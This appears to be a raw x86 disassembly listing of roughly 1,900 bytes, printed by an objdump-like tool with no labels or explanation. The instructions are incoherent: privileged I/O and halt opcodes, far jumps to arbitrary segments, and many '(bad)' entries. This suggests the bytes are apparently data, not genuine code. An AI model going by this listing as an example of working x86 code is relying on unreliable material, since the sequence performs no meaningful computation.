  41f453:	cmc    
  41f454:	mov    ah,0x26
  41f456:	jg     0x41f4d0
  41f458:	rol    DWORD PTR [ebp-0x5b],1
  41f45b:	scas   al,BYTE PTR es:[edi]
  41f45c:	adc    eax,ebp
  41f45e:	cmp    edi,DWORD PTR [ebx+0x2e]
  41f461:	test   al,0x57
  41f463:	es imul ebx,esi,0x71
  41f467:	add    DWORD PTR [esi],0x3
  41f46a:	outs   dx,BYTE PTR ds:[esi]
  41f46b:	fwait
  41f46c:	js     0x41f4d0
  41f46e:	aad    0x56
  41f470:	adc    BYTE PTR [ecx-0x47],dh
  41f473:	cmp    DWORD PTR [edx],edx
  41f475:	pop    ss
  41f476:	mov    edi,0x269d041
  41f47b:	sbb    ebx,DWORD PTR [ebp-0x17]
  41f47e:	jns    0x41f402
  41f480:	ds scas eax,DWORD PTR es:[edi]
  41f482:	push   ebp
  41f483:	cmc    
  41f484:	xor    eax,0xc716ab63
  41f489:	inc    edx
  41f48a:	mov    dh,0xd4
  41f48c:	push   esi
  41f48d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f48e:	aaa    
  41f48f:	test   DWORD PTR [esi-0x5c5f9ff8],esi
  41f495:	setbe  BYTE PTR [edi+ebp*1+0x529fbf02]
  41f49d:	sbb    al,0xac
  41f49f:	out    0xcc,eax
  41f4a1:	out    dx,al
  41f4a2:	pop    esp
  41f4a3:	xchg   ebp,eax
  41f4a4:	js     0x41f45f
  41f4a6:	inc    eax
  41f4a7:	rcr    DWORD PTR [esi+edx*4+0x64],1
  41f4ab:	mov    edx,0xa072b6e3
  41f4b0:	and    ebp,DWORD PTR [esi]
  41f4b2:	arpl   sp,di
  41f4b4:	icebp  
  41f4b5:	xchg   esi,ebp
  41f4b7:	mov    dl,al
  41f4b9:	in     eax,dx
  41f4ba:	es inc edi
  41f4bc:	loopne 0x41f532
  41f4be:	out    dx,eax
  41f4bf:	pop    esi
  41f4c0:	push   es
  41f4c1:	fwait
  41f4c2:	repz jmp 0x236c:0x18281eef
  41f4ca:	xlat   BYTE PTR ds:[ebx]
  41f4cb:	repnz mov al,0x81
  41f4ce:	dec    DWORD PTR [eax+0x64]
  41f4d1:	push   ds
  41f4d2:	ins    BYTE PTR es:[edi],dx
  41f4d3:	hlt    
  41f4d4:	std    
  41f4d5:	jnp    0x41f528
  41f4d7:	es imul eax,esi,0x38
  41f4db:	sub    dh,ch
  41f4dd:	adc    al,0x5f
  41f4df:	pop    esp
  41f4e0:	into   
  41f4e1:	fsubr  DWORD PTR [ebx+0x6f]
  41f4e4:	bound  eax,QWORD PTR [ecx+eax*8-0x4]
  41f4e8:	inc    eax
  41f4e9:	test   eax,0x7d3d4545
  41f4ee:	lods   eax,DWORD PTR ds:[esi]
  41f4ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4f0:	add    ecx,DWORD PTR [esi-0xa]
  41f4f3:	test   eax,0x783bd1be
  41f4f8:	add    eax,0xb1748409
  41f4fd:	and    dh,BYTE PTR [ebx-0x76]
  41f500:	add    al,0xd3
  41f502:	inc    ebx
  41f503:	push   edi
  41f504:	jnp    0x41f52a
  41f506:	sub    BYTE PTR ss:[ebx],cl
  41f509:	jle    0x41f50e
  41f50b:	cdq    
  41f50c:	adc    DWORD PTR [edi+0x44],ecx
  41f50f:	gs xor eax,0xb18182f0
  41f515:	mov    ah,0xf3
  41f517:	int    0xb4
  41f519:	mov    edx,DWORD PTR [esi+0xc]
  41f51c:	test   DWORD PTR ds:0xd5c87cc8,eax
  41f522:	icebp  
  41f523:	sahf   
  41f524:	push   edx
  41f525:	jne    0x41f4b8
  41f527:	out    0x89,eax
  41f529:	call   0x47f20a53
  41f52e:	xchg   ecx,eax
  41f52f:	and    dh,BYTE PTR [edi+0x70]
  41f532:	inc    esp
  41f533:	mov    bh,BYTE PTR [ecx]
  41f535:	fs stos BYTE PTR es:[edi],al
  41f537:	sub    BYTE PTR [edi+0x6b7e438c],cl
  41f53d:	adc    eax,DWORD PTR [eax-0x45]
  41f540:	mov    DWORD PTR [ebp+0x612088db],edx
  41f546:	(bad)  
  41f548:	sub    DWORD PTR [edi-0x5728fcef],esp
  41f54e:	or     al,0xf9
  41f550:	cmp    DWORD PTR [eax],eax
  41f552:	sub    DWORD PTR [esi+ebp*8-0x63b176d1],eax
  41f559:	push   ecx
  41f55a:	out    dx,eax
  41f55b:	popa   
  41f55c:	inc    esp
  41f55d:	add    eax,esp
  41f55f:	jmp    0x41f59e
  41f561:	loope  0x41f57e
  41f563:	test   eax,0x3d7c0a03
  41f568:	cmp    DWORD PTR [eiz*1-0x12bde153],esi
  41f56f:	cmp    bh,BYTE PTR [esi+eax*1-0x51b4b5ad]
  41f576:	inc    ecx
  41f577:	int3   
  41f578:	mov    edx,0xd77a3c11
  41f57d:	cmp    bh,cl
  41f57f:	imul   eax,ecx,0x18
  41f582:	imul   ebp,DWORD PTR [edi+0x5ab4a644],0x36
  41f589:	(bad)  
  41f58a:	sbb    edx,DWORD PTR [esi-0x13fa9a11]
  41f590:	clc    
  41f591:	add    eax,0xd5c7f8d1
  41f596:	cwde   
  41f597:	imul   ebx,DWORD PTR [edi+0x262612dc],0x299427da
  41f5a1:	pop    es
  41f5a2:	jo     0x41f5ff
  41f5a4:	sub    BYTE PTR [eax-0x5bcc5436],al
  41f5aa:	retf   0xfcdf
  41f5ad:	cli    
  41f5ae:	call   FWORD PTR [esi+0x59c9cf98]
  41f5b4:	popa   
  41f5b5:	fimul  WORD PTR [ebp-0xe]
  41f5b8:	push   ecx
  41f5b9:	xchg   ebp,eax
  41f5ba:	sub    eax,DWORD PTR [ecx-0x2efb9fa5]
  41f5c0:	test   eax,0x8f346fac
  41f5c5:	dec    eax
  41f5c6:	lods   al,BYTE PTR ds:[esi]
  41f5c7:	push   edx
  41f5c8:	or     bh,BYTE PTR [esi+0x3d]
  41f5cb:	xor    ebp,DWORD PTR [edi+0x344aa1cc]
  41f5d1:	and    ebx,DWORD PTR [ebp+0x27]
  41f5d4:	jae    0x41f582
  41f5d6:	push   cs
  41f5d7:	mov    bh,BYTE PTR [ebp+0x6218fe62]
  41f5dd:	sti    
  41f5de:	adc    eax,0xe6f62ad8
  41f5e3:	pop    edi
  41f5e4:	loopne 0x41f612
  41f5e6:	xor    DWORD PTR [ecx+eax*1-0x42edb54f],esp
  41f5ed:	(bad)  
  41f5ee:	push   edi
  41f5ef:	xor    BYTE PTR [esp+esi*4+0x7],cl
  41f5f3:	leave  
  41f5f4:	xchg   ecx,eax
  41f5f5:	ja     0x41f59b
  41f5f7:	or     edi,edx
  41f5f9:	xchg   edx,eax
  41f5fa:	mov    bl,0x2d
  41f5fc:	pop    ebp
  41f5fd:	add    edx,ebp
  41f5ff:	scas   al,BYTE PTR es:[edi]
  41f600:	mov    esp,0x5c008cb5
  41f606:	xchg   edx,eax
  41f607:	neg    ch
  41f609:	inc    eax
  41f60a:	and    ax,0x991b
  41f60e:	stos   DWORD PTR es:[edi],eax
  41f60f:	jecxz  0x41f658
  41f611:	(bad)  
  41f612:	lock jge 0x41f693
  41f615:	and    eax,0xb467a6bb
  41f61a:	jnp    0x41f65b
  41f61c:	jg     0x41f651
  41f61e:	fldcw  WORD PTR [eax+0x4c]
  41f621:	jge    0x41f665
  41f623:	pop    ebx
  41f624:	(bad)  
  41f625:	push   edx
  41f626:	ret    0xa169
  41f629:	cmp    BYTE PTR ds:0x329b0082,bl
  41f62f:	popa   
  41f630:	xor    DWORD PTR [edx+esi*4],esi
  41f633:	in     al,dx
  41f634:	jmp    0xa72248d1
  41f639:	loopne 0x41f63c
  41f63b:	push   ss
  41f63c:	fimul  DWORD PTR [ebx]
  41f63e:	mov    eax,DWORD PTR [eax]
  41f640:	iret   
  41f641:	cs std 
  41f643:	jmp    0x41f611
  41f645:	or     eax,0x8d8ad47e
  41f64a:	ds stc 
  41f64c:	mov    edx,0x1b449fa1
  41f651:	imul   ecx,DWORD PTR [edi],0x1c
  41f654:	out    dx,eax
  41f655:	jp     0x41f672
  41f657:	iret   
  41f658:	or     eax,0x30040f5f
  41f65d:	pop    edi
  41f65e:	dec    edx
  41f65f:	adc    ah,BYTE PTR [edx]
  41f661:	or     BYTE PTR [esp+ebx*1],cl
  41f664:	lods   al,BYTE PTR ds:[esi]
  41f665:	out    dx,eax
  41f666:	adc    bh,BYTE PTR [edx-0xcd79d41]
  41f66c:	mov    ebp,0x6eca039b
  41f671:	xchg   ecx,eax
  41f672:	adc    ebx,esp
  41f674:	adc    dh,bh
  41f676:	pop    edx
  41f677:	mov    ebx,ebp
  41f679:	shl    DWORD PTR [ebx-0x2fee5d6],cl
  41f67f:	mov    es,WORD PTR [ecx-0x73]
  41f682:	mov    al,0xc8
  41f684:	sbb    BYTE PTR [ecx+edi*4],cl
  41f687:	mov    esp,0xf9d32781
  41f68c:	and    eax,0xe2df1a40
  41f691:	fisub  WORD PTR [ebx]
  41f693:	call   0x1e73bd92
  41f698:	xchg   esp,eax
  41f699:	test   esp,ebp
  41f69b:	mov    bl,0xb3
  41f69d:	imul   ebp,DWORD PTR [edi-0x247c5411],0xb95768ed
  41f6a7:	mov    ecx,0xa1836249
  41f6ac:	mov    al,ds:0x46d794c7
  41f6b1:	pop    ebx
  41f6b2:	sub    al,0x6d
  41f6b4:	rcl    DWORD PTR ds:[esi+ebp*8],1
  41f6b8:	int    0x2
  41f6ba:	es pop ss
  41f6bc:	hlt    
  41f6bd:	cdq    
  41f6be:	cdq    
  41f6bf:	std    
  41f6c0:	jb     0x41f71a
  41f6c2:	(bad)  
  41f6c3:	es lock sbb al,0x97
  41f6c7:	jmp    0x30ec:0xfdb0e76b
  41f6ce:	or     ecx,DWORD PTR [edi-0x7c]
  41f6d1:	dec    edi
  41f6d2:	ret    
  41f6d3:	xor    eax,esi
  41f6d5:	push   ss
  41f6d6:	leave  
  41f6d7:	push   es
  41f6d8:	jo     0x41f692
  41f6da:	imul   ecx,DWORD PTR [esi],0x51
  41f6dd:	sbb    BYTE PTR ds:0x5071e2e0,0x58
  41f6e4:	sti    
  41f6e5:	sub    al,0x20
  41f6e7:	xor    BYTE PTR [edx],dl
  41f6e9:	xchg   ecx,eax
  41f6ea:	push   ecx
  41f6eb:	ss loopne 0x41f686
  41f6ee:	mov    ds:0x8d7dcf56,eax
  41f6f3:	lods   eax,DWORD PTR ds:[esi]
  41f6f4:	mov    edi,0xfd6c861f
  41f6f9:	clc    
  41f6fa:	mov    ds:0x68d1e1ca,eax
  41f6ff:	imul   esp,DWORD PTR [esi+0x46],0x2d1a4e5d
  41f706:	shr    BYTE PTR [esi-0x3a],cl
  41f709:	inc    edi
  41f70a:	test   dl,bh
  41f70c:	ror    DWORD PTR [edx-0x4070afc5],1
  41f712:	and    cl,BYTE PTR [ebx-0x58ab3ce9]
  41f718:	xchg   esp,eax
  41f719:	popf   
  41f71a:	fbld   TBYTE PTR [ebx-0xd]
  41f71d:	sahf   
  41f71e:	test   al,0x7e
  41f720:	jns    0x41f79e
  41f722:	out    0x25,al
  41f724:	mov    bh,0x1d
  41f726:	jnp    0x41f6d7
  41f728:	repnz add eax,0xe6bb241c
  41f72e:	adc    dl,BYTE PTR [esi-0x33852399]
  41f734:	rol    BYTE PTR [edi+edi*4],1
  41f737:	mov    eax,0xbe1168c0
  41f73c:	add    eax,0x7d76a934
  41f741:	add    ebx,DWORD PTR [edx-0x26fb8a49]
  41f747:	push   cs
  41f748:	sbb    eax,0x62adf552
  41f74d:	fisubr WORD PTR ss:[edx+0x40ecef9c]
  41f754:	pop    es
  41f755:	or     DWORD PTR [ebp-0x5f],esp
  41f758:	icebp  
  41f759:	push   ecx
  41f75a:	call   0x5285:0xb64d0852
  41f761:	xchg   bh,ch
  41f763:	inc    ecx
  41f764:	push   edx
  41f765:	xchg   esp,eax
  41f766:	stos   DWORD PTR es:[edi],eax
  41f767:	mov    edx,DWORD PTR [esp+ebp*2]
  41f76a:	pop    es
  41f76b:	dec    eax
  41f76c:	cwde   
  41f76d:	arpl   WORD PTR [edi+0x43],dx
  41f770:	jo     0x41f750
  41f772:	stos   BYTE PTR es:[edi],al
  41f773:	mov    eax,0x2ee30839
  41f778:	push   ss
  41f779:	pop    edx
  41f77a:	nop
  41f77b:	or     eax,0xadfd9af1
  41f780:	pop    edi
  41f781:	jle    0x41f7c9
  41f783:	xlat   BYTE PTR ds:[ebx]
  41f784:	add    BYTE PTR [esp+edi*1],ah
  41f787:	dec    eax
  41f788:	dec    edi
  41f789:	mov    ss,WORD PTR [esi-0x7903c47b]
  41f78f:	fild   WORD PTR [ebx]
  41f791:	adc    al,BYTE PTR [edx-0x25]
  41f794:	popa   
  41f795:	mov    ch,0xe
  41f797:	jae    0x41f764
  41f799:	cmp    al,0x1b
  41f79b:	fstp   QWORD PTR cs:[edx]
  41f79e:	bound  eax,QWORD PTR [edx]
  41f7a0:	jecxz  0x41f796
  41f7a2:	or     al,cl
  41f7a4:	hlt    
  41f7a5:	ins    BYTE PTR es:[edi],dx
  41f7a6:	sub    DWORD PTR [esi+0x44aeae6e],edi
  41f7ac:	ret    0xf9f3
  41f7af:	imul   BYTE PTR [edx+0x3e]
  41f7b2:	shr    BYTE PTR [eax],cl
  41f7b4:	fstp   DWORD PTR [ebx]
  41f7b6:	adc    DWORD PTR [ebx-0x340b0bde],0xe53172ff
  41f7c0:	mov    dh,0x92
  41f7c2:	scas   eax,DWORD PTR es:[edi]
  41f7c3:	push   esp
  41f7c4:	push   0xffffff9c
  41f7c6:	arpl   WORD PTR [esi-0xd],di
  41f7c9:	and    edx,ebx
  41f7cb:	mov    bh,0xdf
  41f7cd:	data16 ss sbb al,0x7d
  41f7d1:	adc    al,0x3d
  41f7d3:	out    0xe7,eax
  41f7d5:	into   
  41f7d6:	push   ebp
  41f7d7:	xchg   esp,ecx
  41f7d9:	push   cs
  41f7da:	cmp    ebx,DWORD PTR [eax-0x15]
  41f7dd:	scas   al,BYTE PTR es:[edi]
  41f7de:	mov    al,0x8d
  41f7e0:	cmp    BYTE PTR [ecx],bl
  41f7e2:	mov    ds:0x1282efda,eax
  41f7e7:	aas    
  41f7e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7e9:	inc    ecx
  41f7ea:	mov    cl,0x29
  41f7ec:	sbb    DWORD PTR ds:0x568d26de,0xef4a395b
  41f7f6:	push   0x45
  41f7f8:	and    bl,BYTE PTR [ecx-0xd5a9713]
  41f7fe:	push   cs
  41f7ff:	ins    DWORD PTR es:[edi],dx
  41f800:	addr16 jno 0x41f7e2
  41f803:	jp     0x41f850
  41f805:	ins    BYTE PTR es:[edi],dx
  41f806:	test   eax,eax
  41f808:	mov    esp,0x39af481
  41f80d:	inc    eax
  41f80e:	ja     0x41f83a
  41f810:	add    cl,BYTE PTR [edx]
  41f812:	rol    BYTE PTR [edx+ebp*4+0x35],1
  41f816:	cmc    
  41f817:	jb     0x41f79e
  41f819:	sbb    al,0xd0
  41f81b:	test   eax,0x9fe09922
  41f820:	ja     0x41f898
  41f822:	sbb    ebx,eax
  41f824:	rcr    DWORD PTR [edx+0x59],0xa8
  41f828:	dec    DWORD PTR [ecx+0x555cd303]
  41f82e:	stc    
  41f82f:	sar    DWORD PTR [esi-0x219bc448],1
  41f835:	sub    al,0x90
  41f837:	lock lea esi,[esi-0x6]
  41f83b:	es repz dec esi
  41f83e:	(bad)  
  41f840:	xchg   esp,eax
  41f841:	inc    edx
  41f842:	cmp    eax,0xfae8c1b8
  41f847:	mov    esi,ebx
  41f849:	mov    ds:0x57697c65,al
  41f84e:	fcmovb st,st(5)
  41f850:	dec    ebx
  41f851:	clc    
  41f852:	mov    ah,0x10
  41f854:	aaa    
  41f855:	or     bh,cl
  41f857:	int    0xe0
  41f859:	sbb    al,ah
  41f85b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f85c:	in     eax,dx
  41f85d:	cmp    BYTE PTR ds:0x4c47d799,0x70
  41f864:	mov    ah,0x7e
  41f866:	push   ds
  41f867:	jmp    0xfbe18eb
  41f86c:	mov    al,0x31
  41f86e:	cdq    
  41f86f:	clc    
  41f870:	scas   eax,DWORD PTR es:[edi]
  41f871:	cwde   
  41f872:	sbb    ecx,DWORD PTR [ebx+0x40]
  41f875:	mov    edx,0x39a460b6
  41f87a:	lods   al,BYTE PTR ds:[esi]
  41f87b:	mov    ebp,0xa58cb797
  41f880:	int3   
  41f881:	rcr    cl,0x37
  41f884:	lock cmc 
  41f886:	xchg   di,ax
  41f888:	mov    edx,0x71754b92
  41f88d:	clc    
  41f88e:	pusha  
  41f88f:	ins    DWORD PTR es:[edi],dx
  41f890:	daa    
  41f891:	addr16 xor al,0x20
  41f894:	enter  0x7b29,0x6c
  41f898:	es dec edx
  41f89a:	imul   edi,eax,0xffffffe4
  41f89d:	jb     0x41f863
  41f89f:	repnz sbb eax,0xbc174eae
  41f8a5:	xchg   edx,eax
  41f8a6:	fsub   QWORD PTR [ebx]
  41f8a8:	(bad)  
  41f8a9:	scas   eax,DWORD PTR es:[edi]
  41f8aa:	fs dec ebx
  41f8ac:	push   ds
  41f8ad:	adc    al,0x13
  41f8af:	mov    ah,BYTE PTR [ebx+ecx*1+0x5f]
  41f8b3:	cmp    ah,BYTE PTR [edi-0x10d99fa3]
  41f8b9:	loopne 0x41f90d
  41f8bb:	cmp    bh,0xf8
  41f8be:	pop    es
  41f8bf:	(bad)  
  41f8c0:	jno    0x41f8f1
  41f8c2:	int    0x4a
  41f8c4:	dec    edi
  41f8c5:	sbb    cl,al
  41f8c7:	mov    BYTE PTR [eax+0x56bcbe01],ch
  41f8cd:	inc    edx
  41f8ce:	cs sahf 
  41f8d0:	mov    ebp,eax
  41f8d2:	and    ah,BYTE PTR [edi]
  41f8d4:	jg     0x41f887
  41f8d6:	loopne 0x41f93b
  41f8d8:	ror    BYTE PTR [esi+0x21],0x5b
  41f8dc:	jmp    0x2dbe:0xc168f41f
  41f8e3:	jo     0x41f8b2
  41f8e5:	cmp    DWORD PTR [edx-0x34],esi
  41f8e8:	lods   eax,DWORD PTR ds:[esi]
  41f8e9:	inc    esi
  41f8ea:	add    esp,eax
  41f8ec:	pop    ebp
  41f8ed:	and    BYTE PTR [ebp-0x76],dh
  41f8f0:	or     bh,BYTE PTR [esi]
  41f8f2:	fmul   st,st(4)
  41f8f4:	loop   0x41f8b8
  41f8f6:	push   eax
  41f8f7:	fstp   TBYTE PTR [ebx-0x71]
  41f8fa:	add    al,0xa5
  41f8fc:	popf   
  41f8fd:	jno    0x41f88b
  41f8ff:	and    ah,ch
  41f901:	jb     0x41f89a
  41f903:	add    BYTE PTR [ebp*1+0x6e917d40],al
  41f90a:	popf   
  41f90b:	aas    
  41f90c:	out    dx,al
  41f90d:	mov    BYTE PTR fs:[ebx+ebx*4+0x72e219d9],0x75
  41f916:	cmp    al,0x8
  41f918:	mov    BYTE PTR [ebx+0x5d],bl
  41f91b:	or     eax,0x55ecd8bb
  41f920:	xchg   edi,eax
  41f921:	aad    0x93
  41f923:	xor    eax,0x959d7d9c
  41f928:	cmp    BYTE PTR [edx],bl
  41f92a:	jbe    0x41f971
  41f92c:	jle    0x41f918
  41f92e:	push   esi
  41f92f:	dec    esp
  41f930:	push   esi
  41f931:	mov    cl,0x76
  41f933:	call   DWORD PTR [eax]
  41f935:	lds    eax,FWORD PTR [ebx]
  41f937:	(bad)  
  41f938:	jg     0x41f9aa
  41f93a:	xor    dl,BYTE PTR [ebx]
  41f93c:	push   ss
  41f93d:	push   ss
  41f93e:	jle    0x41f9ae
  41f940:	lods   al,BYTE PTR ds:[esi]
  41f941:	jmp    0x41f916
  41f943:	hlt    
  41f944:	sbb    al,0xc5
  41f946:	xchg   ecx,eax
  41f947:	inc    ecx
  41f948:	jg     0x41f958
  41f94a:	scas   al,BYTE PTR es:[edi]
  41f94b:	mov    eax,ds:0x868eb63c
  41f950:	scas   al,BYTE PTR es:[edi]
  41f951:	cmp    DWORD PTR [edx-0x45],esi
  41f954:	(bad)  
  41f955:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f956:	jo     0x41f960
  41f958:	push   ebx
  41f959:	and    al,0x9f
  41f95b:	sub    bl,BYTE PTR [ebx+0x313f2651]
  41f961:	pop    ebp
  41f962:	fsubr  DWORD PTR [esi]
  41f964:	stc    
  41f965:	push   eax
  41f966:	dec    ebp
  41f967:	cmp    al,0x43
  41f969:	fist   DWORD PTR [ebx]
  41f96b:	aaa    
  41f96c:	adc    ah,ch
  41f96e:	mov    ecx,0x1d21058c
  41f973:	jbe    0x41f910
  41f975:	mov    ecx,0x3b60f70d
  41f97a:	clc    
  41f97b:	dec    eax
  41f97c:	pop    edi
  41f97d:	push   edi
  41f97e:	hlt    
  41f97f:	xchg   ebp,eax
  41f980:	cwde   
  41f981:	jl     0x41f9e1
  41f983:	ret    0xf710
  41f986:	stos   BYTE PTR es:[edi],al
  41f987:	push   cs
  41f988:	mov    ebx,0x7fd760f7
  41f98d:	neg    DWORD PTR [esi+0x76780a52]
  41f993:	push   ds
  41f994:	inc    edi
  41f995:	mov    esi,0x36027cc8
  41f99a:	fisubr DWORD PTR [ebp+0x7e]
  41f99d:	ror    DWORD PTR [ebx+0x1a],0x26
  41f9a1:	std    
  41f9a2:	cs and eax,0xe7a8e9b6
  41f9a8:	dec    ebp
  41f9a9:	lahf   
  41f9aa:	and    dh,BYTE PTR [ecx-0x23f86c0c]
  41f9b0:	xor    ebx,DWORD PTR [edi+0x4f3af260]
  41f9b6:	xchg   esi,eax
  41f9b7:	icebp  
  41f9b8:	fdiv   QWORD PTR [edi-0x45]
  41f9bb:	or     BYTE PTR [ebx-0x1b],bl
  41f9be:	xor    esp,DWORD PTR [eax-0x55]
  41f9c1:	adc    DWORD PTR [edi+0x30],esi
  41f9c4:	stos   BYTE PTR es:[edi],al
  41f9c5:	pusha  
  41f9c6:	adc    al,BYTE PTR [ecx+edi*8]
  41f9c9:	add    ebp,esi
  41f9cb:	xchg   esi,eax
  41f9cc:	je     0x41f97d
  41f9ce:	pop    es
  41f9cf:	test   DWORD PTR [edx+0x434c4cbb],ebx
  41f9d5:	cwde   
  41f9d6:	ret    
  41f9d7:	rcr    DWORD PTR [edx],1
  41f9d9:	mov    ds:0xd9830ac9,eax
  41f9de:	test   eax,0xe6a77130
  41f9e3:	repnz fld DWORD PTR [eax+0x7cdc3b29]
  41f9ea:	xor    ebx,DWORD PTR [ebp+0x2f3a7df]
  41f9f0:	jo     0x41f9a5
  41f9f2:	pushf  
  41f9f3:	mov    ah,0xfb
  41f9f5:	pushf  
  41f9f6:	mov    dl,0x1b
  41f9f8:	push   edx
  41f9f9:	cs mov ebx,edx
  41f9fc:	inc    ebp
  41f9fd:	sbb    bh,dh
  41f9ff:	fcomp  QWORD PTR [edx+eax*8]
  41fa02:	in     al,0x16
  41fa04:	add    eax,0x62467f8f
  41fa09:	mov    esp,DWORD PTR [esi]
  41fa0b:	clc    
  41fa0c:	jnp    0x41fa80
  41fa0e:	sbb    edx,DWORD PTR [edi+0x6a]
  41fa11:	push   ds
  41fa12:	cwde   
  41fa13:	sub    eax,0x71bb2122
  41fa18:	inc    esi
  41fa19:	retf   
  41fa1a:	jmp    0x41f9ee
  41fa1c:	adc    al,0x3e
  41fa1e:	jl     0x41fa32
  41fa20:	out    dx,eax
  41fa21:	xor    ebx,DWORD PTR [edx-0x34]
  41fa24:	push   ss
  41fa25:	mov    ebp,eax
  41fa27:	mov    eax,ds:0xa4c068f7
  41fa2c:	in     al,0x8c
  41fa2e:	sbb    BYTE PTR [edi],bh
  41fa30:	jge    0x41f9f7
  41fa32:	sbb    DWORD PTR [eax-0x36],ebx
  41fa35:	pushf  
  41fa36:	retf   
  41fa37:	jg     0x41fa8a
  41fa39:	in     eax,0xf1
  41fa3b:	pusha  
  41fa3c:	aad    0x83
  41fa3e:	xor    BYTE PTR [ebx+edi*8+0x74],ah
  41fa42:	sar    edx,cl
  41fa44:	ja     0x41faa9
  41fa46:	mov    DWORD PTR [edx],ecx
  41fa48:	in     eax,dx
  41fa49:	scas   eax,DWORD PTR es:[edi]
  41fa4a:	cs retf 
  41fa4c:	mov    eax,esp
  41fa4e:	popf   
  41fa4f:	jnp    0x41fa3a
  41fa51:	leave  
  41fa52:	lock adc DWORD PTR [edi+ecx*1-0x10],esi
  41fa57:	test   DWORD PTR [ecx+0x31],ebp
  41fa5a:	retf   0xe8f5
  41fa5d:	fld    TBYTE PTR [edx+0x5]
  41fa60:	mov    cl,0x41
  41fa62:	dec    edx
  41fa63:	inc    esp
  41fa64:	cmp    ebx,DWORD PTR [esi]
  41fa66:	sbb    edi,DWORD PTR [ebx]
  41fa68:	aam    0x62
  41fa6a:	jle    0x41fa7a
  41fa6c:	xchg   ebp,eax
  41fa6d:	and    al,0x62
  41fa6f:	sbb    edi,ebp
  41fa71:	fisttp QWORD PTR [esi-0x78]
  41fa74:	dec    ebx
  41fa75:	push   ecx
  41fa76:	dec    esp
  41fa78:	sub    al,0x5e
  41fa7a:	sbb    al,0xdb
  41fa7c:	sbb    eax,0x37e660cc
  41fa81:	arpl   WORD PTR [ecx+0x35],bp
  41fa84:	shl    BYTE PTR [ecx+0x7604359e],0x3f
  41fa8b:	or     bl,BYTE PTR [edx+0x22]
  41fa8e:	push   esi
  41fa8f:	and    esi,DWORD PTR [ebp+0x285edec3]
  41fa95:	sbb    al,0xde
  41fa97:	jne    0x41fa7f
  41fa99:	xor    eax,0x2d0f06ac
  41fa9e:	aam    0x67
  41faa0:	jecxz  0x41fb00
  41faa2:	mov    edi,0x20f6619a
  41faa7:	mov    ss,WORD PTR [eax]
  41faa9:	cmp    DWORD PTR [esp+ebx*1+0x27c5db84],edx
  41fab0:	pop    eax
  41fab1:	push   ss
  41fab2:	xor    ecx,DWORD PTR [ecx-0x2607ba6d]
  41fab8:	cdq    
  41fab9:	sub    al,0x70
  41fabb:	inc    edi
  41fabc:	or     al,0x53
  41fabe:	pop    es
  41fabf:	push   cs
  41fac0:	and    esp,DWORD PTR [esi+0x71]
  41fac3:	add    ecx,DWORD PTR [ebx]
  41fac5:	mov    eax,0x9a26a838
  41faca:	dec    edx
  41facb:	pop    ss
  41facc:	gs bnd jp 0x41fad7
  41fad0:	and    DWORD PTR [edi+0xd],esi
  41fad3:	inc    esi
  41fad4:	push   ecx
  41fad5:	xchg   ebp,eax
  41fad6:	sub    eax,0xddb34905
  41fadb:	iret   
  41fadc:	bound  eax,QWORD PTR gs:[edx-0x6bae4260]
  41fae3:	jg     0x41fab5
  41fae5:	stos   BYTE PTR es:[edi],al
  41fae6:	xchg   DWORD PTR [esi-0x77b3fd11],esp
  41faec:	sar    DWORD PTR [ebp-0x540d89df],cl
  41faf2:	push   0xc84137fc
  41faf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41faf8:	imul   esp,DWORD PTR [esi-0x421695a9],0xffffff93
  41faff:	and    DWORD PTR [ebp-0x2c],0x5937b68c
  41fb06:	pusha  
  41fb07:	add    cl,ah
  41fb09:	(bad)  
  41fb0b:	jl     0x41fb1d
  41fb0d:	jo     0x41fa92
  41fb0f:	retf   
  41fb10:	out    dx,eax
  41fb11:	test   eax,0xb83c0f74
  41fb16:	fsub   st(0),st
  41fb18:	push   0x37d32f88
  41fb1d:	inc    ecx
  41fb1e:	out    dx,eax
  41fb1f:	hlt    
  41fb20:	push   esp
  41fb21:	inc    edi
  41fb22:	or     ebp,DWORD PTR [esi+0x595db84b]
  41fb28:	adc    ebx,esp
  41fb2a:	jle    0x41fb98
  41fb2c:	pop    ss
  41fb2d:	repnz or esi,DWORD PTR [esi-0x42]
  41fb31:	pop    esi
  41fb32:	xchg   BYTE PTR [ecx-0x45],bh
  41fb35:	test   DWORD PTR [ebx-0x59],esi
  41fb38:	out    0xc0,al
  41fb3a:	or     esp,DWORD PTR [edx+0x6e]
  41fb3d:	std    
  41fb3e:	mov    bh,0xb5
  41fb40:	mov    esi,0x37c744fc
  41fb45:	push   edx
  41fb46:	lods   eax,DWORD PTR ds:[esi]
  41fb47:	jmp    0x12e2:0x57fbfc9c
  41fb4e:	jle    0x41fba4
  41fb50:	dec    edi
  41fb51:	ret    0x3b92
  41fb54:	pop    ebp
  41fb55:	jp     0x41fb20
  41fb57:	outs   dx,BYTE PTR ds:[esi]
  41fb58:	cmp    eax,0xba2d7c7f
  41fb5d:	mov    ds:0x4b088c72,eax
  41fb62:	in     al,dx
  41fb63:	sar    bh,0xfb
  41fb66:	mov    ds:0x68832078,eax
  41fb6b:	loop   0x41fb0f
  41fb6d:	sub    al,0x18
  41fb6f:	not    BYTE PTR [eax-0x14]
  41fb72:	or     esp,edi
  41fb74:	or     esp,DWORD PTR [edx-0x494bc8fa]
  41fb7a:	outs   dx,BYTE PTR ds:[esi]
  41fb7b:	inc    ebp
  41fb7c:	ss jp  0x41fb34
  41fb7f:	jmp    DWORD PTR [esi]
  41fb81:	push   eax
  41fb82:	push   ebp
  41fb83:	loopne 0x41fb79
  41fb85:	pop    eax
  41fb86:	push   ebp
  41fb87:	out    dx,al
  41fb88:	aad    0xab
  41fb8a:	and    bl,0xdc
  41fb8d:	push   ecx
  41fb8e:	inc    ebx
  41fb8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb90:	(bad)  [edi-0x66]
  41fb93:	and    cl,BYTE PTR [ebp+0xb]
  41fb96:	aad    0xc2
  41fb98:	fnstcw WORD PTR [ebx-0xc31e391]
  41fb9e:	sub    BYTE PTR [ebx+0x4487d8a6],ch
  41fba4:	sub    BYTE PTR [ebx+0x53],bl
  41fba7:	xchg   ecx,eax
  41fba8:	shl    DWORD PTR [eax-0x608dc951],cl
  41fbae:	cli    
